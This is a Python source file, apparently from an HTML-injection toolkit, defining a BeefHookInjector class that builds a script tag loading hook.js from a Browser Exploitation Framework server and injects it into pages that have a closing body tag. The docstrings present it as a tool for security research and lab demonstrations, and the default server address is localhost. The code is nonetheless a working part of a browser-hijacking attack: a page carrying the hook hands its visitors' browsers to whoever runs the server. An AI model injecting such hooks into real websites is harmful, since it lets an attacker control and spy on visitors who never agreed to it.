"""
BeEF hook injector.

This injector generates a BeEF (Browser Exploitation Framework) hook script
for security research and lab demonstrations.
"""

from typing import Optional

from .base import BaseInjector


class BeefHookInjector(BaseInjector):
    """
    Injector that generates a BeEF hook script.

    BeEF is a security research tool for testing browser vulnerabilities.
    This injector creates a hook script that connects to a BeEF server.
    """

    def __init__(self, config: Optional[dict] = None):
        """
        Initialize the BeEF hook injector.

        Args:
            config: Configuration dict with 'host' and 'port' for BeEF server
        """
        super().__init__(config)
        self.beef_host = self.config.get("host", "127.0.0.1")
        self.beef_port = self.config.get("port", 3000)
        self.hook_url = self.config.get("hook_url")

        if not self.hook_url:
            self.hook_url = f"http://{self.beef_host}:{self.beef_port}/hook.js"

    def get_payload(self) -> str:
        """
        Generate the BeEF hook script tag.

        Returns:
            Script tag pointing to BeEF hook.js
        """
        return f'<script src="{self.hook_url}"></script>'

    def should_inject(self, html_content: str) -> bool:
        """
        Check if injection should occur.

        Args:
            html_content: HTML content to check

        Returns:
            True if </body> tag is present
        """
        return "</body>" in html_content

    def validate_payload(self, payload: str) -> bool:
        """
        Validate the BeEF hook URL.

        Args:
            payload: The payload to validate

        Returns:
            True if payload contains a valid script tag
        """
        if not super().validate_payload(payload):
            return False

        # Check that it's a script tag with src
        return "<script src=" in payload and "</script>" in payload
